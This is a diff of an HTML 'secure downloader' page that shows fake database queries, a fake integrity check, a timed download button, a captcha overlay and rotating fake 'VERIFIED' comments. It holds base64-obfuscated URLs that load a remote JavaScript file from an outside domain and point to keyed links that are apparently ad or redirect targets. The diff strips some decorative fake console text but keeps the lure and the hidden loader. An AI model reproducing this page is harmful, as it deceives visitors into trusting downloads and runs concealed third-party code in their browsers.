@@ -46,10 +46,6 @@
         .live-status { background: #fff; padding: 6px 15px; border-radius: 20px; font-size: 11px; color: #666; margin-top: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e0e0e0; }
         .live-dot { height: 8px; width: 8px; background-color: var(--danger); border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        
-        .ai-terminal { width: 90%; max-width: 450px; background: #111; color: #00ff41; font-family: 'Courier New', monospace; padding: 6px 12px; border-radius: 8px; font-size: 11px; margin-top: 20px; border: 1px solid #222; box-shadow: 0 4px 15px rgba(0,0,0,0.2); height: 32px; display: flex; align-items: center; overflow: hidden; }
-        .ai-cursor { display: inline-block; width: 7px; height: 13px; background: #00ff41; margin-left: 5px; animation: aiBlink 0.8s infinite; }
-        @keyframes aiBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
 
         .download-card { background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 450px; margin-top: 20px; padding: 30px; text-align: center; position: relative; }
         .icon-box { width: 70px; height: 70px; margin: 0 auto 10px; position: relative; display: flex; align-items: center; justify-content: center; }
@@ -66,19 +62,12 @@
         .loader-bg { background: #eee; border-radius: 20px; height: 10px; width: 100%; margin: 15px 0; overflow: hidden; }
         .loader-fill { background: var(--primary); height: 100%; width: 0%; transition: width 5s linear; }
 
-        /* DATABASE BOX STYLING */
         .db-matrix { width: 100%; border: 1px solid #ddd; margin: 15px 0; border-radius: 4px; overflow: hidden; font-family: 'Courier New', Courier, monospace; }
         .db-row { display: flex; border-bottom: 1px solid #eee; background: #fdfdfd; }
         .db-row:last-child { border-bottom: none; }
         .db-cell-key { width: 40%; background: #f4f4f4; padding: 6px 10px; font-size: 10px; text-transform: uppercase; color: #777; font-weight: bold; text-align: left; border-right: 1px solid #ddd; }
         .db-cell-val { width: 60%; padding: 6px 10px; font-size: 11px; color: #333; text-align: left; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
         
-        /* SCROLLING CONSOLE BOX */
-        .console-box { width: 100%; height: 60px; background: #0f111a; border-radius: 4px; margin-top: 15px; padding: 8px; overflow-y: hidden; text-align: left; font-family: 'Courier New', monospace; border: 1px solid #333; }
-        .console-line { font-size: 9px; line-height: 1.4; color: #8a9199; margin: 0; white-space: nowrap; }
-        .console-line span { color: #51afef; }
-        .console-line.success { color: #98be65; }
-
         .btn { display: block; text-decoration: none; width: 100%; padding: 16px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; color: white; background: #adb5bd; cursor: not-allowed; transition: 0.3s; -webkit-tap-highlight-color: transparent; }
         .btn.active { background: var(--success); cursor: pointer; box-shadow: 0 4px 12px rgba(40,167,69,0.3); }
         
@@ -200,10 +189,6 @@
 
 <div class="live-status"><span class="live-dot"></span> <span id="vCount">----</span> active node connections</div>
 
-<div class="ai-terminal">
-    <span>> </span><span id="aiText">INITIALIZING NEURAL LINK...</span><span class="ai-cursor"></span>
-</div>
-
 <div class="download-card">
     <div class="icon-box">
         <div id="scanLine" class="scan-line"></div>
@@ -211,7 +196,7 @@
             <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.4 0 2.5 1.1 2.5 2.5S13.4 12 12 12s-2.5-1.1-2.5-2.5S10.6 7 12 7zm3 10H9v-1c0-1.1.9-2 2-2h2c1.1 0 2 .9 2 2v1z"/>
         </svg>
     </div>
-    <h2 id="title" style="margin:0; font-size: 22px;">​SECURE DOWNLOADER</h2>
+    <h2 id="title" style="margin:0; font-size: 22px;">SECURE DOWNLOADER</h2>
     <div class="status-text"><span id="statusTxt" class="pulse-text" style="color:#17a2b8">QUERYING DATABASE...</span><div id="finalCheck" class="css-check"></div></div>
     
     <div class="db-matrix">
@@ -245,10 +230,6 @@
     
     <a id="dlBtn" href="javascript:void(0)" class="btn" style="pointer-events: none;">PLEASE WAIT (5s)</a>
     
-    <div class="console-box" id="consoleLogs">
-        <p class="console-line"><span>[SYS]</span> Booting transit kernel...</p>
-    </div>
-
     <div class="game-wrapper">
         <div style="color: #007bff; font-size: 9px; font-weight: bold; margin-bottom: 4px; text-transform: uppercase;">Portal Jumper v1.3</div>
         <canvas id="gameCanvas" width="400" height="120"></canvas>
@@ -288,6 +269,7 @@
 
     (function(){
         const cvs = document.getElementById('gameCanvas');
+        if(!cvs) return;
         const ctx = cvs.getContext('2d');
         let bird = { x: 50, y: 60, v: 0, g: 0.22, j: -4.2, s: 12 };
         let portals = [];
@@ -296,7 +278,7 @@
         let highScore = localStorage.getItem('portalHighScore') || 0;
         let frame = 0;
         let isDead = false;
-        let showGameOver = false; // Flag to trigger game over screen
+        let showGameOver = false;
 
         function createExplosion(x, y) {
             for(let i=0; i<15; i++) {
@@ -326,17 +308,16 @@
                 ctx.fillRect(p.x, 0, p.w, p.y); ctx.fillRect(p.x, p.y + p.gap, p.w, cvs.height);
                 if(!isDead && bird.x < p.x + p.w && bird.x + bird.s > p.x && (bird.y < p.y || bird.y + bird.s > p.y + p.gap)) {
                     isDead = true;
-                    showGameOver = true; // Trigger Game Over visual
+                    showGameOver = true;
                     createExplosion(bird.x + bird.s/2, bird.y + bird.s/2);
                     setTimeout(() => {
                         if(score > highScore) { highScore = score; localStorage.setItem('portalHighScore', highScore); }
                         score = 0; portals = []; isDead = false; showGameOver = false; bird.y = 60; bird.v = 0;
-                    }, 1200); // Pause for the Game Over display
+                    }, 1200);
                 }
                 if(!isDead && p.x + p.w < bird.x && !p.passed) { score++; p.passed = true; }
             });
 
-            // GAME OVER DISPLAY LOGIC
             if(showGameOver) {
                 ctx.fillStyle = "rgba(255, 0, 0, 0.2)";
                 ctx.fillRect(0,0,cvs.width,cvs.height);
@@ -361,7 +342,6 @@
     })();
 
     (function(){
-        
         const _s1 = "aHR0cHM6Ly9iYWxscm9vbWZvbmRuZXNzbm92ZWx0eS5jb20vYmIvZjIvZGEv";
         const _s2 = "YmJmMmRhYmRlNTZkYmZkZDZiZmVmMmE2N2NiOTE3NDUuanM=";
         const _src = atob(_s1) + atob(_s2);
@@ -372,31 +352,23 @@
         const d = document, w = window, gi = (id) => d.getElementById(id);
         const _dec = (s) => atob(s);
 
-        const aiLines = ["EXECUTING SQL_QUERY::SELECT_REMOTE_NODE...", "HANDSHAKING WITH STORAGE CLUSTER 04...", "DECRYPTING DATABASE SHARD HASHES...", "SYNCHRONIZING REPLICATION LOGS...", "VERIFYING DATA INTEGRITY CHECKSUM...", "NODE PORTAL STABILIZED: LATENCY 14ms", "REMOTE_DB_ACCESS: GRANTED."];
-        let aiIdx = 0; let aiPaused = false;
-        setInterval(() => { if(!aiPaused) { gi('aiText').innerText = aiLines[aiIdx]; aiIdx = (aiIdx + 1) % aiLines.length; } }, 3500);
-
         const _p1a = "aHR0cHM6Ly9iYWxscm9vbWZvbmRuZXNzbm92ZWx0eS5jb20vcGljZ2FjaXl0eA==",
               _p1b = "P2tleT03MjY5YzIxYTE3ZDViYTgxNzIyZDg4NTQ3NzY0M2IzNQ==",
               _p2a = "aHR0cHM6Ly9iYWxscm9vbWZvbmRuZXNzbm92ZWx0eS5jb20vcGtjbWJ5aWZoZg==",
               _p2b = "P2tleT05ZmJiN2MzMGQwMjIzODJkOTY3NDdkMDA0OTU1MmNjNg==";
 
         const _ad = _dec(_p1a) + _dec(_p1b), _ad2 = _dec(_p2a) + _dec(_p2b);
-        const _b = gi('dlBtn'), _f = gi('fill'), _s = gi('statusTxt'), _o = gi('verifyOverlay'), _n = gi('fileName'), _hp = gi('btp'), _con = gi('consoleLogs');
+        const _b = gi('dlBtn'), _f = gi('fill'), _s = gi('statusTxt'), _o = gi('verifyOverlay'), _n = gi('fileName'), _hp = gi('btp');
 
         const _params = new URLSearchParams(w.location.search);
         _n.innerText = _params.get('n') || "secure_access_file.zip";
         const _file = _params.get('file');
 
-        function addLog(txt, cls='') {
-            const p = d.createElement('p'); p.className = 'console-line ' + cls;
-            p.innerHTML = `<span>[${new Date().toLocaleTimeString([], {hour12:false})}]</span> ${txt}`;
-            _con.appendChild(p); _con.scrollTop = _con.scrollHeight;
-        }
-
         gi('dbID').innerText = "RN-" + Math.floor(100000 + Math.random() * 900000);
 
         let dataReceived = 0;
+        let _sec = 5;
+
         const transferInterval = setInterval(() => {
             if (_sec > 0) {
                 const speed = (Math.random() * (12.5 - 8.2) + 8.2).toFixed(2);
@@ -410,27 +382,12 @@
         }, 100);
 
         setTimeout(() => { _f.style.width = "100%"; }, 50);
-        let _sec = 5;
+        
         const statusTi = setInterval(() => {
-            if(_sec > 4) { 
-                _s.innerText = "INITIALIZING DB_LINK..."; 
-                addLog("Connecting to distributed mirror cluster...");
-            }
-            else if (_sec > 3) { 
-                _s.innerText = "QUERYING SHARDED STORAGE..."; 
-                gi('dbHash').innerText = "CALCULATING...";
-                addLog("Querying SQL Shard ID: " + Math.random().toString(16).slice(2,8));
-            }
-            else if (_sec > 2) { 
-                _s.innerText = "RETRIEVING BINARY BLOB..."; 
-                gi('dbHash').innerText = "e3b0c44298fc1c149afbf4c8996...";
-                gi('dbEnc').innerText = "AES-XTC-256";
-                addLog("Handshake success. AES-256 key decrypted.");
-            }
-            else if (_sec > 1) { 
-                _s.innerText = "FINALIZING INTEGRITY SCAN..."; 
-                addLog("File integrity scan: 100% clean.", "success");
-            }
+            if(_sec > 4) { _s.innerText = "INITIALIZING DB_LINK..."; }
+            else if (_sec > 3) { _s.innerText = "QUERYING SHARDED STORAGE..."; gi('dbHash').innerText = "CALCULATING..."; }
+            else if (_sec > 2) { _s.innerText = "RETRIEVING BINARY BLOB..."; gi('dbHash').innerText = "e3b0c44298fc1c149afbf4c8996..."; gi('dbEnc').innerText = "AES-XTC-256"; }
+            else if (_sec > 1) { _s.innerText = "FINALIZING INTEGRITY SCAN..."; }
         }, 1000);
 
         const _ti = setInterval(() => {
@@ -439,11 +396,9 @@
             else {
                 clearInterval(_ti);
                 _b.style.pointerEvents = "auto"; _b.classList.add('active'); _b.innerText = "DOWNLOAD NOW";
-                aiPaused = true; gi('aiText').innerText = "DOWNLOAD READY: DATABASE SYNC SUCCESSFUL.";
                 _s.innerText = "FILE LOCATED: INTEGRITY VERIFIED"; _s.classList.remove('pulse-text'); _s.style.color = "#28a745";
                 gi('finalCheck').style.display = "inline-block"; gi('mainIcon').style.fill = "#28a745";
                 _o.style.display = "flex"; gi('captchaContainer').style.display = "block"; d.body.style.overflow = "hidden";
-                addLog("All systems nominal. Ready for transit.", "success");
             }
         }, 1000);
 
@@ -511,13 +466,15 @@
         ];
 
         function u() {
-            for (let i = pool.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [pool[i], pool[j]] = [pool[j], pool[i]]; }
+            let tempPool = [...pool];
+            for (let i = tempPool.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [tempPool[i], tempPool[j]] = [tempPool[j], tempPool[i]]; }
             let h = "";
             for(let i=0; i<10; i++) {
                 const m = Math.floor(Math.random() * 59) + 1;
-                h += `<div class="comment"><div class="comment-meta"><strong>${pool[i].n} <span class="v-badge">VERIFIED</span></strong><span>${m}m ago</span></div>${pool[i].t}</div>`;
+                h += `<div class="comment"><div class="comment-meta"><strong>${tempPool[i].n} <span class="v-badge">VERIFIED</span></strong><span>${m}m ago</span></div>${tempPool[i].t}</div>`;
             }
-            gi('commentList').innerHTML = h;
+            const cList = gi('commentList');
+            if(cList) cList.innerHTML = h;
         }
         u(); setInterval(u, 15000);
     })();
